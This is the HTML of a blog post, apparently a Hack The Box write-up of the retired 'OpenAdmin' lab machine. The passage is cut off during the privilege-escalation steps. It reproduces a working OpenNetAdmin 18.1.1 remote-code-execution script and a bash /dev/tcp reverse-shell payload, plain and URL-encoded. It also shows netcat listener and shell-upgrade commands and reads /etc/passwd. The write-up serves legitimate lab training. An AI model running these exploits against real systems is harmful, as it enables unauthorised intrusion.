<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="OpenAdmin Writeup" /><meta property="og:locale" content="en" /><meta name="description" content="Cybersecurity topics all over." /><meta property="og:description" content="Cybersecurity topics all over." /><link rel="canonical" href="/posts/openadmin/" /><meta property="og:url" content="/posts/openadmin/" /><meta property="og:site_name" content="0xsyr0" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-11-06T01:38:56+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="OpenAdmin Writeup" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-07-06T13:09:48+02:00","datePublished":"2020-11-06T01:38:56+01:00","description":"Cybersecurity topics all over.","headline":"OpenAdmin Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/openadmin/"},"url":"/posts/openadmin/"}</script><title>OpenAdmin Writeup | 0xsyr0</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="0xsyr0"><meta name="application-name" content="0xsyr0"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">0xsyr0</a></div><div class="site-subtitle font-italic">Personal blog.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/0xsyr0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://x.com/syr0_" aria-label="x" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['syr0','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>OpenAdmin Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>OpenAdmin Writeup</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1604623136" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Nov 6, 2020 </em> </span> <span> Updated <em class="" data-ts="1720264188" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 6, 2024 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/0xsyr0">0xsyr0</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2262 words"> <em>12 min</em> read</span></div></div></div><div class="post-content"><p><a href="https://www.hackthebox.eu/home/machines/profile/222"><img data-src="https://raw.githubusercontent.com/0xsyr0/0xsyr0.github.io/master/assets/img/htb/openadmin/openadmin_info_card.jpg" alt="Banner" data-proofer-ignore></a></p><h1 id="informationopenadmin">Information@openadmin:~$</h1><div class="table-wrapper"><table><thead><tr><th style="text-align: left">Column<th style="text-align: left">Detail<tbody><tr><td style="text-align: left">Name<td style="text-align: left">OpenAdmin<tr><td style="text-align: left">IP<td style="text-align: left">10.10.10.171<tr><td style="text-align: left">Points<td style="text-align: left">20<tr><td style="text-align: left">OS<td style="text-align: left">Linux<tr><td style="text-align: left">Difficulty<td style="text-align: left">Easy<tr><td style="text-align: left">Creator<td style="text-align: left"><a href="https://www.hackthebox.eu/home/users/profile/82600">dmw0ng</a><tr><td style="text-align: left">Released on<td style="text-align: left">4 Jan 2020<tr><td style="text-align: left">Retired on<td style="text-align: left">2 May 2020</table></div><h1 id="briefopenadmin">Brief@openadmin:~$</h1><p>The box starts off with only port <code class="language-plaintext highlighter-rouge">TCP/22</code> and <code class="language-plaintext highlighter-rouge">TCP/80</code> open. After running gobuster against port 80, it revealed a <code class="language-plaintext highlighter-rouge">/music</code> subdirectory which provided information about the software <code class="language-plaintext highlighter-rouge">OpenNetAdmin 18.1.1</code> running on it.</p><p>By using an remote code execution exploit from exploit-db, it was possible to get a shell on the box.</p><p>During some basic enumeration of the <code class="language-plaintext highlighter-rouge">/var/www</code> directory, the credentials for the privilege escalation to <code class="language-plaintext highlighter-rouge">jimmy</code> were found in the file called <code class="language-plaintext highlighter-rouge">database_settings.inc.php</code>. With jimmy it was possible to access the <code class="language-plaintext highlighter-rouge">internal</code> directory.</p><p>Within the directory a file called <code class="language-plaintext highlighter-rouge">main.php</code> revealed the information that the <code class="language-plaintext highlighter-rouge">ssh private key</code> for <code class="language-plaintext highlighter-rouge">joanna</code> can be optained by accessing the <code class="language-plaintext highlighter-rouge">main.php</code> on the interal listening webserver.</p><p>After generating a crackable <code class="language-plaintext highlighter-rouge">hash</code> out of the private key by using <code class="language-plaintext highlighter-rouge">ssh2john</code>, the password for the key could be cracked by using <code class="language-plaintext highlighter-rouge">john</code> and the user flag could be taken.</p><p>Due some basic privilege testing the information showed up that joanna was able to execute <code class="language-plaintext highlighter-rouge">nano</code> with <code class="language-plaintext highlighter-rouge">root</code> privileges. The last step was to find the command sequence on <code class="language-plaintext highlighter-rouge">GTFObins</code> and the box was owned.</p><h1 id="summary">Summary</h1><ul><li>Start off with Nmap as always<li>Gobuster reveals the <strong>/music</strong> directory<li>Get information about the software <strong>OpenNetAdmin</strong><li>Get the <strong>exploit</strong> for the remote code execution from <strong>exploit-db</strong><li>After getting a <strong>reverse shell</strong>, upgrade the shell<li>Start with enumerating <strong>/var/www/</strong><li>Find credentials in the <strong>database_settings.inc.php</strong> file<li>Reuse the password for the user jimmy<li>Enumerate the <strong>internal</strong> direcotry and find the <strong>main.php</strong> file<li>Throw a <strong>curl</strong> request against the local listener to trigger the <strong>main.php</strong> file<li>Optain the <strong>ssh private key</strong> for joanna<li>Create a crackable hash using <strong>ssh2john</strong><li>Crack the password with <strong>john</strong><li>Login as joanna and take the <strong>user.txt</strong><li>Check the privileges of joanna and figure out that the user can start <strong>nano</strong> with <strong>sudo</strong><li>Get the command sequence for <strong>nano</strong> from <strong>GTFObins</strong><li>Execute it to pop a <strong>root shell</strong> and to optain the <strong>root.txt</strong></ul><h1 id="reconnaissance">Reconnaissance</h1><h2 id="nmap"><span class="mr-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> nmap 10.10.10.171
<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 18:28 CEST
Nmap scan report for 10.10.10.171
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
</span><span class="gp">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.86 seconds
</span></pre></table></code></div></div><p>We notice that port <code class="language-plaintext highlighter-rouge">22/tcp</code> and port <code class="language-plaintext highlighter-rouge">80/tcp</code> are open.</p><h2 id="gobuster"><span class="mr-2">Gobuster</span><a href="#gobuster" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.10.10.171/
<span class="go">===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/25 18:51:23 Starting gobuster
===============================================================
/music (Status: 301)
/artwork (Status: 301)
</span></pre></table></code></div></div><h1 id="footholding">Footholding</h1><p>Let’s check the found directories and start with <code class="language-plaintext highlighter-rouge">/music</code>.</p><blockquote><p>http://10.10.10.171/music</p></blockquote><p>When we click on <code class="language-plaintext highlighter-rouge">login</code> we are getting redirected.</p><blockquote><p>http://10.10.10.171/ona/</p></blockquote><p>By using google we find an available exploit on exploit-db.</p><blockquote><p>https://www.exploit-db.com/exploits/47691</p></blockquote><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="c"># Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution</span>
<span class="c"># Date: 2019-11-19</span>
<span class="c"># Exploit Author: mattpascoe</span>
<span class="c"># Vendor Homepage: http://opennetadmin.com/</span>
<span class="c"># Software Link: https://github.com/opennetadmin/ona</span>
<span class="c"># Version: v18.1.1</span>
<span class="c"># Tested on: Linux</span>

<span class="c"># Exploit Title: OpenNetAdmin v18.1.1 RCE</span>
<span class="c"># Date: 2019-11-19</span>
<span class="c"># Exploit Author: mattpascoe</span>
<span class="c"># Vendor Homepage: http://opennetadmin.com/</span>
<span class="c"># Software Link: https://github.com/opennetadmin/ona</span>
<span class="c"># Version: v18.1.1</span>
<span class="c"># Tested on: Linux</span>

<span class="c">#!/bin/bash</span>

<span class="nv">URL</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">1</span><span class="k">}</span><span class="s2">"</span>
<span class="k">while </span><span class="nb">true</span><span class="p">;</span><span class="k">do
 </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$ </span><span class="s2">"</span><span class="p">;</span> <span class="nb">read </span>cmd
 curl <span class="nt">--silent</span> <span class="nt">-d</span> <span class="s2">"xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo </span><span class="se">\"</span><span class="s2">BEGIN</span><span class="se">\"</span><span class="s2">;</span><span class="k">${</span><span class="nv">cmd</span><span class="k">}</span><span class="s2">;echo </span><span class="se">\"</span><span class="s2">END</span><span class="se">\"</span><span class="s2">&amp;xajaxargs[]=ping"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">URL</span><span class="k">}</span><span class="s2">"</span> | <span class="nb">sed</span> <span class="nt">-n</span> <span class="nt">-e</span> <span class="s1">'/BEGIN/,/END/ p'</span> | <span class="nb">tail</span> <span class="nt">-n</span> +2 | <span class="nb">head</span> <span class="nt">-n</span> <span class="nt">-1</span>
<span class="k">done</span>
</pre></table></code></div></div><p>Let’s download the raw exploit.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>wget https://www.exploit-db.com/raw/47691
</pre></table></code></div></div><p>Then we make it executable.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">chmod</span> +x 47691.sh
</pre></table></code></div></div><p>At last we start the shell script and point it to the target url. And a shell is popping up.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>./47691.sh http://10.10.10.171/ona/
<span class="gp">$</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></pre></table></code></div></div><p>Please make sure you don’t forgett the <code class="language-plaintext highlighter-rouge">/</code> behind <code class="language-plaintext highlighter-rouge">ona</code> because that would break your reverse shell.</p><p>Now this is a pretty restricted shell because we only can enter url encoded input to get code execution.</p><p>In my case i used the <code class="language-plaintext highlighter-rouge">Burp Suite</code> included decoder to encode my payload for a full working reverse shell.</p><blockquote><p>Payload:</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">bash -c 'bash -i &gt;</span>&amp; /dev/tcp/&lt;local_ip&gt;/&lt;local_port&gt; 0&gt;&amp;1<span class="s1">'
</span></pre></table></code></div></div><blockquote><p>Encoded payload:</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%33%2f%39%30%30%31%20%30%3e%26%31%27
</span></pre></table></code></div></div><p>Now we have to start a netcat listener on our desired port, then enter the url encoded string to our shell to get the reverse shell.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 9001
<span class="go">listening on [any] 9001 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.171] 54470
bash: cannot set terminal process group (995): Inappropriate ioctl for device
bash: no job control in this shell
</span><span class="gp">www-data@openadmin:/opt/ona/www$</span><span class="w">
</span></pre></table></code></div></div><p>To upgrade our shell to a bit more comfy one, we use python to import <code class="language-plaintext highlighter-rouge">/bin/bash</code> and then we modify our shell output and exporting xterm.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">www-data@openadmin:/opt/ona/www$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
<span class="gp">$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
</pre></table></code></div></div><p>This was the first part. For the next part we have to exactly enter the following inputs, otherwise we will break your shell.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="go">Ctrl + z
stty raw -echo
fg
Enter
Enter
export XTERM=xterm
</span></pre></table></code></div></div><p>If you ente everything correctly, you will get a full working shell on the box.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="gp">www-data@openadmin:/opt/ona/www$</span><span class="w"> </span>^Z
<span class="go">[1]+  Stopped                 nc -lnvp 9001
</span><span class="gp">$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span>
<span class="gp">$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 9001
<span class="go">
</span><span class="gp">www-data@openadmin:/opt/ona/www$</span><span class="w">
</span><span class="gp">www-data@openadmin:/opt/ona/www$</span><span class="w"> </span><span class="nb">export </span><span class="nv">XTERM</span><span class="o">=</span>xterm
<span class="gp">www-data@openadmin:/opt/ona/www$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">.htaccess.example  images/            login.php          winc/
config/            include/           logout.php         workspace_plugins/
config_dnld.php    index.php          modules/
dcm.php            local/             plugins/
</span><span class="gp">www-data@openadmin:/opt/ona/www$</span><span class="w"> </span><span class="nb">ls</span>
</pre></table></code></div></div><p>Please notice that this only works with bash. If you are using zsh you may ran into some issues.</p><h1 id="enumeration">Enumeration</h1><p>At first we start with some basic manually enumeration on the <code class="language-plaintext highlighter-rouge">/var/www/</code> directory to see what we get.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">www-data@openadmin:/var/www$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="go">ls -la
total 16
drwxr-xr-x  4 root     root     4096 Nov 22  2019 .
drwxr-xr-x 14 root     root     4096 Nov 21  2019 ..
drwxr-xr-x  6 www-data www-data 4096 Nov 22  2019 html
drwxrwx---  2 jimmy    internal 4096 Nov 23  2019 internal
</span><span class="gp">lrwxrwxrwx  1 www-data www-data   12 Nov 21  2019 ona -&gt;</span><span class="w"> </span>/opt/ona/www
</pre></table></code></div></div><p>We notice that we have only access to html and to the directory we are landed after the footholding. Furhter we have to privilege escalate to jimmy, to get access to the internal directory.</p><p>Let’s check who else have an account on this box.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="gp">www-data@openadmin:/var/www$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd
<span class="go">cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
</span></pre></table></code></div></div><p>So we have another user. Let’s take that to our nodes.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">User: jimmy
User: joanna
</span></pre></table></code></div></div><h1 id="privilege-escalation-to-jimmy">Privilege Escalation to jimmy</h1><p>Now we check out what we find inside the ona directory we can access and have a closer look to the <code class="language-plaintext highlighter-rouge">database_settings.inc.php</code> file.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">openadmin</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">ona</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">config</span><span class="err">$</span>  <span class="n">ls</span>
